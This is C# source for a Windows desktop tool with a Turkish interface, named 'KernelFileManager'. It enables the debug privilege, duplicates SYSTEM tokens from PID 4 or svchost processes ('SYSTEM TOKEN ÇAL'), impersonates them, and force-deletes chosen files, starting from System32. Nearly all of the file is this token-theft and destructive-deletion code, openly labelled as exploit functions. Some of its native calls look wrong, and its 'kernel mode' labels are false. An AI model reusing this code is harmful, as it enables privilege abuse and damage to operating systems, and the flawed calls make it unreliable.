using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows;
using System.Windows.Controls;
using Microsoft.Win32;

namespace KernelFileManager
{
    public partial class MainWindow : Window
    {
        // ==================== KERNEL DIRECT API ====================
        
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtQuerySystemInformation(int SystemInformationClass,
            IntPtr SystemInformation, uint SystemInformationLength, out uint ReturnLength);
        
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtOpenProcess(ref IntPtr ProcessHandle, uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);
        
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtDuplicateObject(IntPtr SourceProcessHandle, IntPtr SourceHandle,
            IntPtr TargetProcessHandle, out IntPtr TargetHandle, uint DesiredAccess,
            uint HandleAttributes, uint Options);
        
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);
        
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtDeleteFile(ref UNICODE_STRING ObjectName);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,
            IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool SetThreadToken(IntPtr Thread, IntPtr Token);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
        
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();
        
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();
        
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess,
            uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition,
            uint dwFlagsAndAttributes, IntPtr hTemplateFile);
        
        // ==================== STRUCTURES ====================
        
        [StructLayout(LayoutKind.Sequential)]
        private struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }
        
        [StructLayout(LayoutKind.Sequential)]
        private struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }
        
        [StructLayout(LayoutKind.Sequential)]
        private struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }
        
        [StructLayout(LayoutKind.Sequential)]
        private struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
        {
            public IntPtr Object;
            public IntPtr UniqueProcessId;
            public IntPtr HandleValue;
            public uint GrantedAccess;
            public ushort CreatorBackTraceIndex;
            public ushort ObjectTypeIndex;
            public uint HandleAttributes;
            public uint Reserved;
        }
        
        // ==================== CONSTANTS ====================
        
        private const int SE_DEBUG_PRIVILEGE = 20;
        private const int SE_TCB_PRIVILEGE = 7;
        private const int SE_IMPERSONATE_PRIVILEGE = 29;
        
        private const uint PROCESS_ALL_ACCESS = 0x1FFFFF;
        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
        private const uint PROCESS_DUP_HANDLE = 0x0040;
        
        private const uint TOKEN_ALL_ACCESS = 0xF01FF;
        private const uint TOKEN_QUERY = 0x0008;
        private const uint TOKEN_DUPLICATE = 0x0002;
        private const uint TOKEN_IMPERSONATE = 0x0004;
        private const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        
        private const uint SecurityImpersonation = 2;
        private const uint TokenPrimary = 1;
        
        private const int SystemExtendedHandleInformation = 64;
        
        private const uint FILE_READ_ATTRIBUTES = 0x0080;
        private const uint FILE_WRITE_ATTRIBUTES = 0x0100;
        private const uint DELETE = 0x00010000;
        private const uint SYNCHRONIZE = 0x00100000;
        private const uint FILE_SHARE_READ = 0x00000001;
        private const uint FILE_SHARE_WRITE = 0x00000002;
        private const uint FILE_SHARE_DELETE = 0x00000004;
        private const uint OPEN_EXISTING = 3;
        private const uint FILE_FLAG_BACKUP_SEMANTICS = 0x02000000;
        private const uint FILE_FLAG_OPEN_REPARSE_POINT = 0x00200000;
        
        // ==================== GLOBAL VARIABLES ====================
        
        private IntPtr systemToken = IntPtr.Zero;
        private bool isSystemElevated = false;
        private List<FileItem> fileList = new List<FileItem>();
        
        public class FileItem
        {
            public string Name { get; set; } = string.Empty;
            public string Path { get; set; } = string.Empty;
            public string Size { get; set; } = string.Empty;
            public string Owner { get; set; } = "Unknown";
            public string Status { get; set; } = "Unknown";
            public bool IsSystemFile { get; set; }
        }
        
        public MainWindow()
        {
            InitializeComponent();
            InitializeButtons();
            
            EnableDebugPrivilege();
            
            txtStatus.Text = "🔓 Debug Privilege alındı\n🎯 'SYSTEM TOKEN ÇAL' butonuna basın";
            btnStealToken.IsEnabled = true;
        }
        
        private void InitializeButtons()
        {
            btnBrowse.Click += BtnBrowse_Click;
            btnStealToken.Click += BtnStealToken_Click;
            btnBecomeSystem.Click += BtnBecomeSystem_Click;
            btnUnlockFile.Click += BtnUnlockFile_Click;
            btnKernelDelete.Click += BtnKernelDelete_Click;
            btnForceDelete.Click += BtnForceDelete_Click;
            btnRefresh.Click += BtnRefresh_Click;
        }
        
        // ==================== KERNEL EXPLOIT FUNCTIONS ====================
        
        private bool EnableDebugPrivilege()
        {
            try
            {
                bool enabled;
                uint status = RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, true, false, out enabled);
                return status == 0 && enabled;
            }
            catch
            {
                return false;
            }
        }
        
        private bool StealSystemTokenNT()
        {
            try
            {
                int[] systemPids = { 4 };
                
                foreach (int pid in systemPids)
                {
                    try
                    {
                        IntPtr processHandle = IntPtr.Zero;
                        OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
                        CLIENT_ID clientId = new CLIENT_ID();
                        clientId.UniqueProcess = new IntPtr(pid);
                        
                        uint status = NtOpenProcess(ref processHandle, PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
                            ref objAttr, ref clientId);
                        
                        if (status == 0 && processHandle != IntPtr.Zero)
                        {
                            IntPtr tokenHandle;
                            if (OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_QUERY, out tokenHandle))
                            {
                                IntPtr duplicatedToken;
                                if (DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, IntPtr.Zero,
                                    SecurityImpersonation, TokenPrimary, out duplicatedToken))
                                {
                                    systemToken = duplicatedToken;
                                    
                                    using (WindowsIdentity identity = new WindowsIdentity(duplicatedToken))
                                    {
                                        if (identity.Name.Contains("SYSTEM") || identity.Name.Contains("NT AUTHORITY"))
                                        {
                                            CloseHandle(tokenHandle);
                                            CloseHandle(processHandle);
                                            return true;
                                        }
                                    }
                                }
                                CloseHandle(tokenHandle);
                            }
                            CloseHandle(processHandle);
                        }
                    }
                    catch { }
                }
                
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Token steal error: {ex.Message}");
                return false;
            }
        }
        
        private bool StealTokenFromServices()
        {
            try
            {
                Process[] svchostProcesses = Process.GetProcessesByName("svchost");
                
                foreach (Process proc in svchostProcesses)
                {
                    try
                    {
                        IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, false, proc.Id);
                        
                        if (processHandle != IntPtr.Zero)
                        {
                            IntPtr tokenHandle;
                            if (OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_QUERY, out tokenHandle))
                            {
                                IntPtr duplicatedToken;
                                if (DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, IntPtr.Zero,
                                    SecurityImpersonation, TokenPrimary, out duplicatedToken))
                                {
                                    systemToken = duplicatedToken;
                                    
                                    using (WindowsIdentity identity = new WindowsIdentity(duplicatedToken))
                                    {
                                        if (identity.Name.Contains("SYSTEM") || 
                                            identity.Name.Contains("LOCAL SERVICE") || 
                                            identity.Name.Contains("NETWORK SERVICE"))
                                        {
                                            CloseHandle(tokenHandle);
                                            CloseHandle(processHandle);
                                            return true;
                                        }
                                    }
                                }
                                CloseHandle(tokenHandle);
                            }
                            CloseHandle(processHandle);
                        }
                    }
                    catch { }
                }
                
                return false;
            }
            catch
            {
                return false;
            }
        }
        
        private bool ImpersonateSystemToken()
        {
            try
            {
                if (systemToken == IntPtr.Zero)
                    return false;
                
                if (ImpersonateLoggedOnUser(systemToken))
                {
                    isSystemElevated = true;
                    return true;
                }
                
                if (SetThreadToken(IntPtr.Zero, systemToken))
                {
                    isSystemElevated = true;
                    return true;
                }
                
                return false;
            }
            catch
            {
                return false;
            }
        }
        
        private bool KernelModeDelete(string filePath)
        {
            try
            {
                if (!isSystemElevated && !ImpersonateSystemToken())
                    return false;
                
                string ntPath = @"\??\" + filePath;
                
                byte[] bytes = Encoding.Unicode.GetBytes(ntPath + "\0");
                IntPtr buffer = Marshal.AllocHGlobal(bytes.Length);
                Marshal.Copy(bytes, 0, buffer, bytes.Length);
                
                UNICODE_STRING unicodeString = new UNICODE_STRING
                {
                    Length = (ushort)(bytes.Length - 2),
                    MaximumLength = (ushort)bytes.Length,
                    Buffer = buffer
                };
                
                int status = NtDeleteFile(ref unicodeString);
                Marshal.FreeHGlobal(buffer);
                
                return status >= 0;
            }
            catch
            {
                return false;
            }
        }
        
        private bool CreateFileWithDelete(string filePath)
        {
            try
            {
                if (!isSystemElevated && !ImpersonateSystemToken())
                    return false;
                
                IntPtr fileHandle = CreateFile(
                    filePath,
                    DELETE | FILE_READ_ATTRIBUTES | FILE_WRITE_ATTRIBUTES | SYNCHRONIZE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    IntPtr.Zero,
                    OPEN_EXISTING,
                    FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
                    IntPtr.Zero);
                
                if (fileHandle != IntPtr.Zero && fileHandle.ToInt32() != -1)
                {
                    CloseHandle(fileHandle);
                    return true;
                }
                
                return false;
            }
            catch
            {
                return false;
            }
        }
        
        // ==================== UI BUTTON HANDLERS ====================
        
        private void BtnStealToken_Click(object sender, RoutedEventArgs e)
        {
            btnStealToken.IsEnabled = false;
            txtStatus.Text = "🔍 SYSTEM Token aranıyor...";
            
            Thread stealThread = new Thread(() =>
            {
                bool success = false;
                
                success = StealSystemTokenNT();
                
                if (!success)
                    success = StealTokenFromServices();
                
                Dispatcher.Invoke(() =>
                {
                    if (success)
                    {
                        txtStatus.Text = "✅ SYSTEM Token çalındı!\n👑 'SYSTEM OL' butonuna basın";
                        btnBecomeSystem.IsEnabled = true;
                    }
                    else
                    {
                        txtStatus.Text = "❌ Token çalınamadı\n⚠️ Manuel deneyin veya yeniden başlatın";
                        btnStealToken.IsEnabled = true;
                    }
                });
            });
            
            stealThread.IsBackground = true;
            stealThread.Start();
        }
        
        private void BtnBecomeSystem_Click(object sender, RoutedEventArgs e)
        {
            if (ImpersonateSystemToken())
            {
                txtStatus.Text = "✅ SYSTEM SEVİYESİNE YÜKSELDİN!";
                
                btnUnlockFile.IsEnabled = true;
                btnKernelDelete.IsEnabled = true;
                btnForceDelete.IsEnabled = true;
                
                try
                {
                    WindowsIdentity identity = WindowsIdentity.GetCurrent();
                    txtStatus.Text += $"\n👤 Şu anki kullanıcı: {identity.Name}";
                }
                catch { }
            }
            else
            {
                txtStatus.Text = "❌ SYSTEM olunamadı";
            }
        }
        
        private void BtnBrowse_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new OpenFileDialog
            {
                Title = "SYSTEM Dosyası Seç",
                Multiselect = true,
                Filter = "Sistem dosyaları (*.dll;*.exe;*.sys)|*.dll;*.exe;*.sys|Tüm dosyalar (*.*)|*.*",
                InitialDirectory = @"C:\Windows\System32"
            };
            
            if (dialog.ShowDialog() == true)
            {
                fileList.Clear();
                
                foreach (var filePath in dialog.FileNames)
                {
                    try
                    {
                        var info = new FileInfo(filePath);
                        bool isSystem = (info.Attributes & FileAttributes.System) == FileAttributes.System;
                        
                        fileList.Add(new FileItem
                        {
                            Name = info.Name,
                            Path = filePath,
                            Size = FormatSize(info.Length),
                            Owner = isSystem ? "SYSTEM" : "Unknown",
                            Status = isSystem ? "SYSTEM 🔒" : "Normal",
                            IsSystemFile = isSystem
                        });
                    }
                    catch { }
                }
                
                lstFiles.ItemsSource = fileList;
                txtStatus.Text = $"📁 {fileList.Count} dosya seçildi";
            }
        }
        
        private void BtnUnlockFile_Click(object sender, RoutedEventArgs e)
        {
            if (!isSystemElevated)
            {
                MessageBox.Show("Önce SYSTEM olmalısınız!", "UYARI", 
                              MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }
            
            if (lstFiles.SelectedItem is FileItem selectedFile)
            {
                try
                {
                    txtStatus.Text = $"🔓 SYSTEM: '{selectedFile.Name}' kilidi açılıyor...";
                    
                    File.SetAttributes(selectedFile.Path, FileAttributes.Normal);
                    
                    selectedFile.Status = "AÇIK ✅";
                    lstFiles.Items.Refresh();
                    txtStatus.Text = $"✅ SYSTEM: '{selectedFile.Name}' kilidi açıldı";
                }
                catch (Exception ex)
                {
                    txtStatus.Text = $"❌ HATA: {ex.Message}";
                }
            }
        }
        
        private void BtnKernelDelete_Click(object sender, RoutedEventArgs e)
        {
            if (!isSystemElevated)
            {
                MessageBox.Show("Önce SYSTEM olmalısınız!", "UYARI", 
                              MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }
            
            if (lstFiles.SelectedItem is FileItem selectedFile)
            {
                var result = MessageBox.Show(
                    $"[KERNEL MODE] {selectedFile.Name} silinecek!\n\n" +
                    $"Bu işlem kernel seviyesinde yapılacak.\n" +
                    $"Geri alınamaz! Devam?",
                    "KERNEL SİLME",
                    MessageBoxButton.YesNo,
                    MessageBoxImage.Warning);
                
                if (result == MessageBoxResult.Yes)
                {
                    Thread deleteThread = new Thread(() =>
                    {
                        try
                        {
                            Dispatcher.Invoke(() => {
                                txtStatus.Text = $"⚡ KERNEL: '{selectedFile.Name}' siliniyor...";
                            });
                            
                            bool success = KernelModeDelete(selectedFile.Path);
                            
                            Thread.Sleep(1000);
                            
                            Dispatcher.Invoke(() =>
                            {
                                if (!File.Exists(selectedFile.Path))
                                {
                                    fileList.Remove(selectedFile);
                                    lstFiles.Items.Refresh();
                                    txtStatus.Text = $"✅ KERNEL: '{selectedFile.Name}' SİLİNDİ!";
                                }
                                else
                                {
                                    success = CreateFileWithDelete(selectedFile.Path);
                                    Thread.Sleep(500);
                                    
                                    if (!File.Exists(selectedFile.Path))
                                    {
                                        fileList.Remove(selectedFile);
                                        lstFiles.Items.Refresh();
                                        txtStatus.Text = $"✅ KERNEL(2): '{selectedFile.Name}' SİLİNDİ!";
                                    }
                                    else
                                    {
                                        txtStatus.Text = $"❌ KERNEL: Dosya silinemedi";
                                    }
                                }
                            });
                        }
                        catch { }
                    });
                    
                    deleteThread.Start();
                }
            }
        }
        
        private void BtnForceDelete_Click(object sender, RoutedEventArgs e)
        {
            if (!isSystemElevated)
            {
                MessageBox.Show("Önce SYSTEM olmalısınız!", "UYARI", 
                              MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }
            
            if (lstFiles.SelectedItem is FileItem selectedFile)
            {
                var result = MessageBox.Show(
                    $"[FORCE DELETE] {selectedFile.Name} silinecek!\n\n" +
                    $"Tüm yöntemler denenerek zorla silinecek.\n" +
                    $"ÇOK TEHLİKELİ! Devam?",
                    "FORCE DELETE",
                    MessageBoxButton.YesNo,
                    MessageBoxImage.Error);
                
                if (result == MessageBoxResult.Yes)
                {
                    Thread forceThread = new Thread(() =>
                    {
                        try
                        {
                            Dispatcher.Invoke(() => {
                                txtStatus.Text = $"💀 FORCE: '{selectedFile.Name}' yok ediliyor...";
                            });
                            
                            for (int i = 0; i < 3; i++)
                            {
                                if (!File.Exists(selectedFile.Path)) break;
                                
                                KernelModeDelete(selectedFile.Path);
                                Thread.Sleep(300);
                                
                                if (!File.Exists(selectedFile.Path)) break;
                                
                                CreateFileWithDelete(selectedFile.Path);
                                Thread.Sleep(300);
                                
                                if (!File.Exists(selectedFile.Path)) break;
                                
                                try { File.Delete(selectedFile.Path); } catch { }
                                Thread.Sleep(300);
                            }
                            
                            Thread.Sleep(1000);
                            
                            Dispatcher.Invoke(() =>
                            {
                                if (!File.Exists(selectedFile.Path))
                                {
                                    fileList.Remove(selectedFile);
                                    lstFiles.Items.Refresh();
                                    txtStatus.Text = $"☠️ FORCE: '{selectedFile.Name}' YOK EDİLDİ!";
                                }
                                else
                                {
                                    txtStatus.Text = $"💀 FORCE: Dosya hala direniyor!";
                                }
                            });
                        }
                        catch { }
                    });
                    
                    forceThread.Start();
                }
            }
        }
        
        private void BtnRefresh_Click(object sender, RoutedEventArgs e)
        {
            if (fileList.Count > 0)
            {
                foreach (var file in fileList)
                {
                    try
                    {
                        if (File.Exists(file.Path))
                        {
                            var info = new FileInfo(file.Path);
                            file.Size = FormatSize(info.Length);
                            file.IsSystemFile = (info.Attributes & FileAttributes.System) == FileAttributes.System;
                            file.Status = file.IsSystemFile ? "SYSTEM 🔒" : "Normal";
                        }
                        else
                        {
                            file.Status = "SİLİNDİ ✅";
                        }
                    }
                    catch { }
                }
                lstFiles.Items.Refresh();
            }
        }
        
        private string FormatSize(long bytes)
        {
            if (bytes == 0) return "0 B";
            string[] sizes = { "B", "KB", "MB", "GB" };
            int order = 0;
            double len = bytes;
            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len = len / 1024;
            }
            return $"{len:0.##} {sizes[order]}";
        }
    }
}